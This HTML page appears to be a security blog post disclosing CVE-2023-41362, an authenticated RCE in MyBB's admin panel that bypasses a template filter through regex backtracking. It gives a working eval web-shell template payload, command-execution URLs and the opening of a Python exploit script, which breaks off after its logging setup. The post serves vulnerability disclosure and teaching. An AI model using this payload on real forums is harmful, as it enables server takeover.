<!DOCTYPE html>


<html lang="en-us" data-theme="">
<head>
    
        
<meta charset="utf-8">
<meta name="HandheldFriendly" content="True">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer-when-downgrade">

<title>MyBB Admin Panel RCE CVE-2023-41362 - Sorcery Blog</title>

<meta name="description" content="This blog post explores a critical vulnerability in MyBB&rsquo;s admin panel, leading to authenticated Remote Code Execution (RCE). MyBB is a popular forum software with a template system that utilizes eval() to render templates.
We will discuss how this vulnerability in the admin panel&rsquo;s template handling can be exploited for RCE.
We can change these templates in the admin panel. When we submit changes to templates they get put through the check_template() function in admin/functions.">





<link rel="icon" type="image/x-icon" href="https://blog.sorcery.ie/favicon.ico">
<link rel="apple-touch-icon-precomposed" href="https://blog.sorcery.ie/favicon.png">




    



<style>
  body {
    visibility: hidden;
    opacity: 0;
  }
</style>

<noscript>
  <style>
    body {
      visibility: visible;
      opacity: 1;
    }
  </style>
</noscript>




    





    
    
        
    
    

    
        <link rel="stylesheet" href="https://blog.sorcery.ie/css/style.min.a510743797774628f397ef53ba4fa2aa52917d2027b03f800cbe560d7c374be4.css" integrity="sha256-pRB0N5d3Rijzl&#43;9Tuk&#43;iqlKRfSAnsD&#43;ADL5WDXw3S&#43;Q=">
    





    

    





    
    
        
    
    

    
        <script src="https://blog.sorcery.ie/js/script.min.74bf1a3fcf1af396efa4acf3e660e876b61a2153ab9cbe1893ac24ea6d4f94ee.js" type="678f3b8a7d1349265c8fb8d9-text/javascript" charset="utf-8" integrity="sha256-dL8aP88a85bvpKzz5mDodrYaIVOrnL4Yk6wk6m1PlO4="></script>
    







<meta property="og:url" content="https://blog.sorcery.ie/posts/mybb_acp_rce/">
  <meta property="og:site_name" content="Sorcery Blog">
  <meta property="og:title" content="MyBB Admin Panel RCE CVE-2023-41362">
  <meta property="og:description" content="This blog post explores a critical vulnerability in MyBB’s admin panel, leading to authenticated Remote Code Execution (RCE). MyBB is a popular forum software with a template system that utilizes eval() to render templates.
We will discuss how this vulnerability in the admin panel’s template handling can be exploited for RCE.
We can change these templates in the admin panel. When we submit changes to templates they get put through the check_template() function in admin/functions.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-09-11T00:00:00+00:00">
    <meta property="article:modified_time" content="2023-09-11T00:00:00+00:00">
    <meta property="article:tag" content="Mybb">
    <meta property="article:tag" content="Rce">
    <meta property="article:tag" content="Regex">
    <meta property="article:tag" content="CVE-2023-41362">
    <meta property="article:tag" content="Redos">


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="MyBB Admin Panel RCE CVE-2023-41362">
  <meta name="twitter:description" content="This blog post explores a critical vulnerability in MyBB’s admin panel, leading to authenticated Remote Code Execution (RCE). MyBB is a popular forum software with a template system that utilizes eval() to render templates.
We will discuss how this vulnerability in the admin panel’s template handling can be exploited for RCE.
We can change these templates in the admin panel. When we submit changes to templates they get put through the check_template() function in admin/functions.">













    
</head>
<body>
    <a class="skip-main" href="#main">Skip to main content</a>
    <div class="container">
        <header class="common-header"> 
            
                <div class="header-top">
    <h1 class="site-title">
    <a href="/">Sorcery Blog</a>
</h1>
    <ul class="social-icons">


    
        
        
        <li>
            <a href="/cdn-cgi/l/email-protection#365f585059764559445553444f185f53" title="Email" rel="me">
            <span class="inline-svg" >




    
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg>

</span>

            </a>
        </li>
    

    
        
        
        <li>
            <a href="https://github.com/SorceryIE" title="Github" rel="me">
            <span class="inline-svg" >




    
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

</span>

            </a>
        </li>
    

    
        
        
        <li>
            <a href="https://twitter.com/SorceryIE" title="Twitter" rel="me">
            <span class="inline-svg" >




    
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>

</span>

            </a>
        </li>
    



    <li>
            <a href="https://blog.sorcery.ie/index.xml" title="RSS" rel="me">
            <span class="inline-svg" >




    
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M128.081 415.959c0 35.369-28.672 64.041-64.041 64.041S0 451.328 0 415.959s28.672-64.041 64.041-64.041 64.04 28.673 64.04 64.041zm175.66 47.25c-8.354-154.6-132.185-278.587-286.95-286.95C7.656 175.765 0 183.105 0 192.253v48.069c0 8.415 6.49 15.472 14.887 16.018 111.832 7.284 201.473 96.702 208.772 208.772.547 8.397 7.604 14.887 16.018 14.887h48.069c9.149.001 16.489-7.655 15.995-16.79zm144.249.288C439.596 229.677 251.465 40.445 16.503 32.01 7.473 31.686 0 38.981 0 48.016v48.068c0 8.625 6.835 15.645 15.453 15.999 191.179 7.839 344.627 161.316 352.465 352.465.353 8.618 7.373 15.453 15.999 15.453h48.068c9.034-.001 16.329-7.474 16.005-16.504z"/></svg>

</span>

            </a>
        </li>
    

</ul>
</div>

    <nav>
        
        
        <a class="" href="https://sorcery.ie" title="Sorcery Ltd">Sorcery Ltd</a>
        
    </nav>






            
        </header>
        <main id="main" tabindex="-1"> 
            
    

    <article class="post h-entry">
        <div class="post-header">
            <header>
                <h1 class="p-name post-title">MyBB Admin Panel RCE CVE-2023-41362</h1>

                
            </header>
        </div>
        




        <div class="content e-content">
            <p>This blog post explores a critical vulnerability in <a href="https://mybb.com/">MyBB</a>&rsquo;s admin panel, leading to authenticated Remote Code Execution (RCE).
MyBB is a popular forum software with a template system that utilizes eval() to render templates.</p>
<p>We will discuss how this vulnerability in the admin panel&rsquo;s template handling can be exploited for RCE.</p>
<p>We can change these templates in the admin panel. When we submit changes to templates they get put through the <code>check_template()</code> function in <code>admin/functions.php</code>.
This function employs regex patterns to scan templates for specific patterns that may indicate malicious code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check_template</span>($template){
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Check to see if our database password is in the template
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;#\$config\[(([\&#39;|&#34;]database[\&#39;|&#34;])|([^\&#39;&#34;].*?))\]\[(([\&#39;|&#34;](database|hostname|password|table_prefix|username)[\&#39;|&#34;])|([^\&#39;&#34;].*?))\]#i&#39;</span>, $template)) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// System calls via backtick
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;#\$\s*\{#&#39;</span>, $template)){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Any other malicious acts?
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// Courtesy of ZiNgA BuRgA
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;~</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$.+?</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">}~s&#34;</span>, <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;~\\{\\$+[a-zA-Z_][a-zA-Z_0-9]*((?:-\\&gt;|\\:\\:)\\$*[a-zA-Z_][a-zA-Z_0-9]*|\\[\s*\\$*([\&#39;&#34;]?)[a-zA-Z_ 0-9 ]+\\2\\]\s*)*\\}~&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $template))){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If check_template returns true the template will be rejected and we won&rsquo;t be able to use it.</p>
<p>In the 3rd case the input is passed through preg_replace before being checked by the preg_match function.</p>
<p>In PHP the <a href="https://www.php.net/manual/en/book.pcre.php">Perl Compatible REgex (PCRE) functions</a> (preg_match, preg_replace etc.) have a pitfall where they don&rsquo;t throw an exception when they reach their backtrack limit. In the case of preg_replace it will return an empty string when the backtrack limit is reached which allows us to bypass the last preg_match. The regex used here is complex enough that we can cause <a href="https://www.regular-expressions.info/catastrophic.html">catastrophic backtracking</a> with just <code>{$a[0]</code> with repeated <code>[0]</code> after it. This is a form of <a href="https://en.wikipedia.org/wiki/ReDoS">ReDoS (Regex Denial of Service)</a>.</p>
<p>You can use <a href="https://devina.io/redos-checker">this tool</a> to determine if a regex is abusable, it even generates strings that trigger these issues.</p>
<p>You can test the behaviour of the PCRE functions in a PHP shell (<code>php -a</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">ini_get</span>(<span style="color:#e6db74">&#39;pcre.backtrack_limit&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1000000</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;~\\{\\$+[a-zA-Z_][a-zA-Z_0-9]*((?:-\\&gt;|\\:\\:)\\$*[a-zA-Z_][a-zA-Z_0-9]*|\\[\s*\\$*([\&#39;&#34;]?)[a-zA-Z_ 0-9 ]+\\2\\]\s*)*\\}~&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;{$a&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str_repeat</span>(<span style="color:#e6db74">&#39;[0]&#39;</span>,<span style="color:#ae81ff">1891</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;}TESTSTRING&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>This should print TESTSTRING but instead it will print nothing. Removing one (or more) of the <code>[0]</code> parts (by reducing the number of repeats) will let it be printed as the backtracking/stack/recursion limit hasn&rsquo;t been reached.</p>
<p>Now that we can bypass this check all we have to do is include the type payload it was made to prevent in your template (we must still avoid the regex checks before it).
The payload I went with was <code>{$db-&gt;insert_id(isset($_GET[1])?die(eval($_GET[1])):'')}</code>.
Initially I thought I needed to find a useful function that was in the scope to use the <code>{$x-&gt;()}</code> format but we found that once we had a function we could do any php calls we needed.
So we opted to use <code>$db-&gt;insert_id()</code> as it doesnt really have any effect after using it and doesn&rsquo;t error loudly when it doesn&rsquo;t get input.</p>
<h1 id="proof-of-concept" >Proof of Concept
<span>
    <a href="#proof-of-concept">
        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
    </a>
</span>
</h1><h2 id="manually" >Manually
<span>
    <a href="#manually">
        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
    </a>
</span>
</h2><p>To demonstrate this vulnerability manually, follow these steps:</p>
<ol>
<li>Login to admin panel</li>
<li>Navigate to &ldquo;Templates &amp; Style&rdquo; &gt; &ldquo;Templates&rdquo; &gt; &ldquo;Default Templates.&rdquo;</li>
<li>Select a template (for instance, &ldquo;Who&rsquo;s Online Templates&rdquo;) and click on &ldquo;online.&rdquo;</li>
<li>Add the following payload to the top of the template:</li>
</ol>
<pre tabindex="0"><code>&lt;!--{$db-&gt;insert_id(isset($_GET[1])?die(eval($_GET[1])):&#39;&#39;)}{$a[0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0]}--&gt;
</code></pre><ol start="5">
<li>Click one of the Save buttons</li>
<li>
<ul>
<li>PHPInfo PoC: <a href="http://example.com/online.php?1=phpinfo();">http://example.com/online.php?1=phpinfo();</a></li>
<li>Command Exec: <a href="http://example.com/online.php?1=system('whoami;pwd');">http://example.com/online.php?1=system('whoami;pwd');</a></li>
</ul>
</li>
</ol>
<h2 id="exploit-script" >Exploit script
<span>
    <a href="#exploit-script">
        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
    </a>
</span>
</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit script for CVE-2023-41362</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://blog.sorcery.ie/posts/mybb_acp_rce/</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> html
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64encode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CustomFormatter</span>(logging<span style="color:#f92672">.</span>Formatter):
</span></span><span style="display:flex;"><span>	yellow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[33;20m&#34;</span>
</span></span><span style="display:flex;"><span>	red <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[31;20m&#34;</span>
</span></span><span style="display:flex;"><span>	bold_red <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[31;1m&#34;</span>
</span></span><span style="display:flex;"><span>	reset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m&#34;</span>
</span></span><span style="display:flex;"><span>	format <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%(levelname)s</span><span style="color:#e6db74">: </span><span style="color:#e6db74">%(message)s</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	FORMATS <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>DEBUG: format,
</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>INFO: <span style="color:#e6db74">&#34;[*] </span><span style="color:#e6db74">%(message)s</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>WARNING: yellow <span style="color:#f92672">+</span> format <span style="color:#f92672">+</span> reset,
</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>ERROR: red <span style="color:#f92672">+</span> format <span style="color:#f92672">+</span> reset,
</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>CRITICAL: bold_red <span style="color:#f92672">+</span> format <span style="color:#f92672">+</span> reset
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">format</span>(self, record):
</span></span><span style="display:flex;"><span>		log_fmt <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>FORMATS<span style="color:#f92672">.</span>get(record<span style="color:#f92672">.</span>levelno)
</span></span><span style="display:flex;"><span>		formatter <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>Formatter(log_fmt)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> formatter<span style="color:#f92672">.</span>format(record)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(__name__)
